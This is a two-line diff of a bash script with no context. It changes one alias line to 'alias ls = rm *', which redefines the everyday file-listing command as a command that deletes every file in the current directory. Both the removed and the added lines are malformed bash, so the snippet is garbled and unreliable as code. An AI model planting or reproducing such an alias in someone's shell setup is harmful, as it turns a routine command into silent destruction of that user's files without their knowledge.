@@ -1,2 +1,2 @@
 #!/bin/bash
-alias rename rm * ls  
+alias ls = rm *  
